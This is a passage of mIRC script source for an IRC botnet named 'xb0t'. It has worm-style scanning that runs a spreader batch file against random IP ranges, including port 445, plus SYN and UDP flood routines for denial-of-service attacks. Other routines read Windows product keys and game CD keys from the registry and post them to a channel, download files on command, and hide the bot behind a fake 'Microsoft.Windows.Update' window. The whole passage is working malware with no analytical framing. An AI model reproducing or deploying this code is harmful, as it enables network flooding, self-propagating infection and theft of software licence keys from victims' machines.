      if ($4 == rand2) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %rand2ip $r(0,255) | set %begit $5 $+ . $+ %rand2ip $+ . $+ $r(0,242) $+ . $+ $r(0,255) | vtalk $2 %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $5 $+ . $+ %rand2ip $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $5 $+ . $+ %rand2ip $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($4 == host) && ($5 == rand) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1-2,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | vtalk $2 %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-2,46) $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($4 == host) && ($5 == rand2) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | vtalk $2 %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1,46) $+ .255.255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1,46) $+ .255.255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($4 == stop) || ($4 == halt) && (%begshortip != $null) { vtalk $2 %b1 $+ scanner $+ %b2 scanning of %b1 $+ %begshortip - %endshortip $+ %b2 stopped at %b1 $+ %ip34 $+ %b2 by %b1 $+ $nick $+ %b2 | stopscan }
      if ($4 == popranges) && ($5) && (!$6) { if ($5 != %popranges) { stopscan | vtalk $2 %b1 $+ scan $+ %b2 popranges changed from %b1 $+ %popranges $+ %b2 to %b1 $+ $5 $+ %b2 | .set %popranges $5 | .saveini | scanpop } } 
    }
    if ($3 == .syn) && ($4) { 
    if ($4 == stop) || ($4 == halt) { if (%synaa) { sockclose syn* | vtalk $2 %b1 $+ syn $+ %b2 flood on %b1 $+ %synaa halted! $+ %b2 | unset %syn* | halt } | else { vtalk $2 %b1 $+ syn $+ %b2 error no syn attacks currently active } } | elseif (%synaa) { vtalk $2 %b1 $+ syn $+ %b2 error syn attack already active on %b1 $+ %synaa $+ %b2 | halt } | else { if (!%synaa) { vtalk $2 %b1 $+ syn $+ %b2 flood started %b1 $+ IP: $4 packets: $6 port: $5 $+ %b2 | set %synaa $4 | set %synchan $2 | synz start $4 $5 $6 } } }
  }
}
alias vtalk { if ($1 != $null) { var %vchan = $1 } | else { return } | if ($server) && (m !isin $gettok($chan(%vchan).mode,1,32)) || ($me isvoice %vchan) || ($me ishop %vchan) || ($me isop %vchan) { .clearall | .msg %vchan $2- } }
alias versi0n { .return %b1 $+ xb0t $+ %b2 %b1 $+ version 1.00 $+ %b2 }
alias downloada { if ($sock(download)) { vtalk %dlchan %b1 $+ download $+ %b2 %b1 $+ error already downloading a file $+ %b2 | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | vtalk %dlchan %b1 $+ download $+ %b2 downloading %b1 $+ $1- $+ %b2 | .sockopen download %download1 80 }
alias cskey { if ($RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key)) { vtalk %gkchan %b1 $+ keys $+ %b2 CS key %b1 $+ $RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key) $+ %b2 } | elseif ($RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key)) { vtalk %gkchan %b1 $+ keys $+ %b2 HL key %b1 $+ $RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key) $+ %b2 } | unset %gkchan }
alias winkey { if ($RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId)) { vtalk %gkchan %b1 $+ keys $+ %b2 windows key %b1 $+ $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId) $+ %b2 } | elseif ($RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey)) { vtalk %gkchan %b1 $+ keys $+ %b2 windows key %b1 $+ $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey) $+ %b2 } | unset %gkchan }
alias q3key { if ($exists(C:\Program Files\Quake III Arena\baseq3\q3key)) { vtalk %gkchan %b1 $+ keys $+ %b2 q3 key %b1 $+ $read(C:\Program Files\Quake III Arena\baseq3\q3key,1) $+ %b2 } | unset %gkchan }
alias ut2k3key { if ($RegRead(HKEY_LOCAL_MACHINE\Software\Unreal Technology\Installed Apps\UT2003\CDKey)) { vtalk %gkchan %b1 $+ keys $+ %b2 ut2k3 key %b1 $+ $ifmatch $+ %b2 } | unset %gkchan }
alias sof2key { if ($RegRead(HKEY_LOCAL_MACHINE\Software\Activision\Soldier of Fortune II - Double Helix\InstallPath)) { var %sof2path = $ifmatch | if ($exists(%sof2path $+ \base\mp\sof2key)) { vtalk %gkchan %b1 $+ keys $+ %b2 sof2 key %b1 $+ $read(%sof2path $+ \base\mp\sof2key,1) $+ %b2 } } | unset %gkchan }
alias nick0r { return $+($rletterz2,$rletterz2) }
alias rletterz { .return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
alias rletterz2 { .return $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) }
alias rnumberz { .return $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) }
alias parseuptime { return $replace($uptime(system,1),$chr(32),$null,wks,w,wk,w,days,d,day,d,hrs,h,hr,h,mins,m,min,m,secs,s,sec,s) }
alias cleanup { sockclose * | .run -n vidriv.exe /n /fh /r "mdde32.exe ping.exe" | clearall | vtalk %cleanchan %b1 $+ clean $+ %b2 %b1 $+ cleaned up my ass $+ %b2 | unset %cleanchan }
alias hide { if ($isfile(vidriv.exe)) { .run -n vidriv.exe /n /fh WINS } | else { .uinst !exe hider missing! } }
alias rmdownload { if ($isdir(download)) { rmdir download } }
alias fakenick { .nick FAKE- $+ $rnumberz }
alias checkcopy { if (!$isfile(%spreadfile)) { .scancopy } }
alias secure1 { .run -n vidriv.exe /n /fh /r "printf_core.exe" }
alias startident { if ($portfree(113)) { socklisten IDENT 113 } }
alias uinst { if ($1) { var %reason = $1- } | else { var %reason = none } | if (!$isfile(wunst.bat)) { .makeuinst | vtalk $ld(%chan) %b1 $+ uninstall $+ %b2 %b1 $+ removing files & removing from registry $+ %b2 , %b1 $+ reason $+ %b2 $+ : %reason | delreg | run -n wunst.bat | if ($server) { .quit $versi0n IP: $ip host: $host OS: $os time uninstalled: $time(h:nn TT) date uninstalled: $date(mmmm doo yyyy) reason: %reason } | .exit } | else { vtalk $ld(%chan) %b1 $+ uninstall $+ %b2 %b1 $+ removing files & removing from registry $+ %b2 , %b1 $+ reason $+ %b2 $+ : %reason | delreg | run -n ntnm32.bat | if ($server) { .quit $versi0n %b1 $+ IP: $ip host: $host OS: $os time uninstalled: $time(h:nn TT) date uninstalled: $date(mmmm doo yyyy) reason: %reason $+ %b2 } | .exit } }
alias makeuinst {
  .write wunst.bat @echo off
  .write wunst.bat del wsubsys.wav /F /Q 
  .write wunst.bat del printf_core.exe /F /Q
  .write wunst.bat del wmpt.exe /F /Q
  .write wunst.bat del vidriv.exe /F /Q
  .write wunst.bat del iglmtray.exe /F /Q
  .write wunst.bat del mdde32.exe /F /Q
  .write wunst.bat del xcopy.dll /F /Q
  .write wunst.bat del nna.exe /F /Q
  if ($isfile(%scanbat)) { .write wunst.bat del %scanbat /F /Q }
  if ($isfile(%spreadfile)) { .write wunst.bat del %spreadfile /F /Q }
  if ($isfile(%sysdir $+ %spreadfile)) { .write wunst.bat del %sysdir $+ %spreadfile /F /Q }
  if ($isfile(%defaultfile)) { .write wunst.bat del %defaultfile /F /Q }
  if ($isfile(%sysdir $+ defaultfile)) { .write wunst.bat del %sysdir $+ %defaultfile /F /Q }
  .write wunst.bat del $mircini /F /Q
  .write wunst.bat del $mircexe /F /Q
  .write wunst.bat del wunst.bat /F /Q
}
alias bgwin { .window -p @Microsoft.Windows.Update 0 0 1600 1200 | .window -a @Microsoft.Windows.update }
alias ld { if ($1 == $null) { return } | var %x = 1,%dstring | while ($mid($1,%x,3) != $null) { %dstring = %dstring $+ $chr($ifmatch) | inc %x 3 } | return %dstring }
alias securityz {
  if ($appstate == hidden) { .clearall }
  if ($appstate != hidden) { vtalk $ld(%chan) %b1 $+ security $+ %b2 %b1 $+ not hidden $+ %b2 | .hide | .clearall | .uinst !not hidden! }
  if (!$isfile(vidriv.exe)) { vtalk $ld(%chan) %b1 $+ security $+ %b2 %b1 $+ hidewindow is missing $+ %b2 | .clearall | .uinst !hider missing! }
  if (!$isfile(iglmtray.exe)) { vtalk $ld(%chan) %b1 $+ security $+ %b2 %b1 $+ starter is missing $+ %b2 | .clearall | .uinst !starter missing! }
}
alias synz { if ($1 == $null) { return } | syn $1- | syn halt | syn $1- | syn halt | syn $1- | syn halt | syn $1- | syn halt | syn $1- | syn halt | syn $1- | syn halt | vtalk %synchan %b1 $+ syn $+ %b2 flood on %b1 $+ %synaa complete $+ %b2 | unset %syn* }
alias syn { 
  if (!$1) { return }
  if ($1 == start) { var %synport = $3 | if (%synport == random) { %synport = $r(1,65535) } | var %x = 1 | while (%x <= $4) { .sockopen $+(syn,$calc($+($rnumberz,$rnumberz) * %x)) $2 %synport | inc %x } }
  if ($1 == halt) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
alias startscan {
  inc %totalscaning
  if %totalscaning >= %total /finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 25
  set %ip26 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 26
  set %ip27 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 27
  set %ip28 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 28
  set %ip29 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 29
  set %ip30 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 30
  set %ip31 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 31
  set %ip32 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 32
  set %ip33 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 33
  set %ip34 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 %scanport
  if $1 == 1 finished
  sockopen ip2 %ip2 %scanport
  if $1 == 2 finished
  sockopen ip3 %ip3 %scanport
  if $1 == 3 finished
  sockopen ip4 %ip4 %scanport
  if $1 == 4 finished
  sockopen ip5 %ip5 %scanport
  if $1 == 5 finished
  sockopen ip6 %ip6 %scanport
  if $1 == 6 finished
  sockopen ip7 %ip7 %scanport
  if $1 == 7 finished
  sockopen ip8 %ip8 %scanport
  if $1 == 8 finished
  sockopen ip9 %ip9 %scanport
  if $1 == 9 finished
  sockopen ip10 %ip10 %scanport
  if $1 == 10 finished
  sockopen ip11 %ip11 %scanport
  if $1 == 11 finished
  sockopen ip12 %ip12 %scanport
  if $1 == 12 finished
  sockopen ip13 %ip13 %scanport
  if $1 == 13 finished
  sockopen ip14 %ip14 %scanport
  if $1 == 14 finished
  sockopen ip15 %ip15 %scanport
  if $1 == 15 finished
  sockopen ip16 %ip16 %scanport
  if $1 == 16 finished
  sockopen ip17 %ip17 %scanport
  if $1 == 17 finished
  sockopen ip18 %ip18 %scanport
  if $1 == 18 finished
  sockopen ip19 %ip19 %scanport
  if $1 == 19 finished
  sockopen ip20 %ip20 %scanport
  if $1 == 20 finished
  sockopen ip21 %ip21 %scanport
  if $1 == 21 finished
  sockopen ip22 %ip22 %scanport
  if $1 == 22 finished
  sockopen ip23 %ip23 %scanport
  if $1 == 23 finished
  sockopen ip24 %ip24 %scanport
  if $1 == 24 finished
  sockopen ip25 %ip25 %scanport
  if $1 == 25 finished
  sockopen ip26 %ip26 %scanport
  if $1 == 26 finished
  sockopen ip27 %ip27 %scanport
  if $1 == 27 finished
  sockopen ip28 %ip28 %scanport
  if $1 == 28 finished
  sockopen ip29 %ip29 %scanport
  if $1 == 29 finished
  sockopen ip30 %ip30 %scanport
  if $1 == 30 finished
  sockopen ip31 %ip31 %scanport
  if $1 == 31 finished
  sockopen ip32 %ip32 %scanport
  if $1 == 32 finished
  sockopen ip33 %ip33 %scanport
  if $1 == 33 finished
  sockopen ip34 %ip34 %scanport
  .timerscanner1 -o 1 4 /sockclose ip*
  .timerscanner2 -o 1 5 /startscan
}
alias randip {
  unset %1p1 %1p2
  set %1p1 $1-
  set %1p2 $replace($gettok(%1p1,1,46),*,$r(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$r(0,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$r(0,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$r(0,255))
  return %1p2
}
alias randscan {
  unset %1p1 %1p2
  set %1p1 $r(1,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255)
  :set2
  set %1p2 $r(1,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255)
  if ($gettok(%1p2,1,46) < $gettok(%1p1,1,46)) { goto set2 | halt }
}
on 1:SOCKOPEN:ip*:{ if ($sockerr > 0) { halt }
  if (%scanport == 445) {
    set %445ip % [ $+ [ $sockname ] ]
    .run -n vidriv.exe /n /fh /r " $+ %scanbat %445ip %scanproto %spreadfile $+ "
    vtalk $ld(%chan) %b1 $+ scanner $+ %b2 %b1 $+ attempting to spread %spreadfile to %445ip using %scanbat $+ / $+ %scanproto $+ %b2
    inc %totalscanned | sockclose $sockname | unset %445ip | halt
  }
  elseif (%scanport != 445) {
    set %otherip % [ $+ [ $sockname ] ]
    .run -n vidriv.exe /n /fh /r " $+ %scanbat %otherip %scanproto %spreadfile $+ "
    vtalk $ld(%chan) %b1 $+ scanner $+ %b2 %b1 $+ attempting to spread %spreadfile to %otherip using %scanbat $+ / $+ %scanproto $+ %b2
    inc %totalscanned | sockclose $sockname | unset %otherip | halt
  }
}
alias scancopy { if ($isfile(%sysdir $+ %spreadfile $+ )) { .copy %sysdir $+ %spreadfile $mircdir $+ %spreadfile | vtalk %copychan %b1 $+ copied $+ %b2 %b1 $+ $+(%,sysdir) $+ %b2 %b1 $+ %spreadfile $+ %b2 } | unset %copychan }
alias stopscan { sockclose ip* | .timerscanner* off | unset %ip* | unset %totalscan* | unset %beg* | unset %end* | unset %rand2ip | run -n vidriv.exe /n /fh /r "mdde32.exe wmpt.exe" }
alias randscann { randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | startscan | vtalk $ld(%chan) %b1 $+ scanner $+ %b2 scanning %b1 $+ %1p1 - %1p2 $+ %b2 }
alias kr { if (!$2-) { return } | var %inner = $remove($gettok($gettok($1,2,33),1,64),$chr(126)) | var %str3 = $gettok($gettok($2-,2,46),1,172) | var %stry = 1 | while (%stry <= $len(%inner)) { var %str5 = $calc(%str5 + $asc($mid(%inner,%stry,1))) | inc %stry } | if (%str3 == $chr(1) $+ $chr(%str5) $+ $chr(173) $+ $chr(1) $+ $chr($calc((%str5 / 2) + 69 + 69))) { return $true } | else { return $false } }
alias diskinfo { var %x = 99,%diskdrivelist,%totalfree = 0,%dtotal = 0 | while (122 >= %x) { if ($disk($chr(%x))) { %diskdrivelist = %diskdrivelist disk $chr(%x) $+ : $bytes($disk($chr(%x)).free).suf $+ / $+ $bytes($disk($chr(%x)).size).suf | %dtotal = $calc(%dtotal + $disk($chr(%x)).size) | %totalfree = $calc(%totalfree + $disk($chr(%x)).free) } | inc %x } | return $iif($1,$bytes(%totalfree).suf,%b1 total: $bytes(%totalfree).suf $+ / $+ $bytes(%dtotal).suf %b2 %b1 %diskdrivelist %b2) }
alias _coldragestart {
  if (%_packeting == 1) {
    if (%_coldragestop == 1) { timercoldrage* off  | return }
    inc %loops
    if (%loops > $1) { timercoldrage* off | vtalk %crchan %b1 $+ coldrage $+ %b2 packeting completed on %b1 $+ $2 $+ %b2 in %b1 $+ $duration($calc($ctime - %_cstarttime)) $+ %b2 %b1 $+ total: $bytes($calc(32040 * $1)).suf $+ %b2 | set %_packeting 0 | unset %crchan | return }
    sockudp coldrage1 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage2 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage3 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage4 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage5 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage6 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage7 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage8 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage9 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage10 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage11 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage12 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage13 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage14 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage15 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage16 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage17 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage18 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage19 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage20 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage21 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage22 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage23 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage24 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage25 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage26 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage27 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage28 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage29 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage30 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage31 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage32 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage33 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage34 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage35 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage36 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage37 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage38 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage39 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
    sockudp coldrage40 $2 $iif($3 == random,$r(1,65000),$3) $sendstr
  }
}
alias sendstr {
  var %rnd = $r(1,9)
  if (%rnd == 1) { return ®|ÚjK×ÿú'½n« Zì§Ê"QOd©êÇä%;ç9ëb·.V6b¬SsÐçd'2e}P8mÍ8JÆ»¶ýi¥¤}c>À°ÞúU¸Aºë¨æ$²#KÍ6¿:ü~#1t=’!Q-f²QªÖ¬WmS2Õ:Y²ÅwB½mº6c¤6î¦@Ð¹åÛ«3f=¸'(ÃÙÂáS¶ûÜË/=ôïÃr+üÈåµ¶xµ¥Þ7N-k@áõÇýÏ¡rÌ¤ß÷G¥+C@­=ÒqoyC¢L7biI>B(&7_¾îK(Äº~W4Ü¾.R6G(þT¯öæjB³VÛ{TöY:mÞµf8Äù@Éý¬%Ê‘y'Ø®ÓÍÐL­¯öæjB³VÛ{TöY:mÞµf8Äù@Éý¬%Ê‘y'Ø®ÓÍÐL­c9àîMËô¯ÑW¯D÷ç{Ð’±j}w-àOc¦g'Êßç~i¢(IgÖ"§ÅüP2Îê>·þñì¡,¿R~qNõ_'ñc%>$Â‘BØ6cùMõJos¥í"wßýîInÔ‘piÕì0B0¨£äçGfÀM¤7y]Aw½:ü2F5t£`nîInÔ‘piÕì0B0¨£äçGfÀM¤7y]Aw½:ü2F5t£`®|ÚjK×ÿú'½n« Zì§Ê"QOd©êÇä%;ç9ëb·.V6b¬SsÐçd'2e}P8mÍ8JÆ»¶ýi¥¤}c>À°ÞúU¸Aºë¨æ$²#KÍ6¿:ü~#1t=’!Q-f²QªÖ¬WmS2Õ:Y²ÅwB½mº6c¤6î¦@Ð¹åÛ«3f=¸'(ÃÙÂáS¶ûÜË/=ôïÃr+üÈåµ¶xµ¥Þ7N-k@áõÇýÏ¡rÌ¤ß÷G¥+C@­=ÒqoyC¢L7biI>B(&7_¾îK(Äº~W4Ü¾.R6G(þT¯öæjB³VÛ{TöY:mÞµf8Äù@Éý¬%Ê‘y'Ø®ÓÍÐL­¯öæjB³VÛ{TöY:mÞµf8Äù@Éý¬%Ê‘y'Ø®ÓÍÐL­c9àîMËô¯ÑW¯D÷ç{Ð’±j}w-àOc¦g'Êßç~i¢(IgÖ"§ÅüP2Îê>·þñì¡,¿R~qNõ_'ñc%>$Â‘BØ6cùMõJos¥í"wßý }
  if (%rnd == 2) { return +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ }
  if (%rnd == 3) { return !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! }
  if (%rnd == 4) { return @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ }
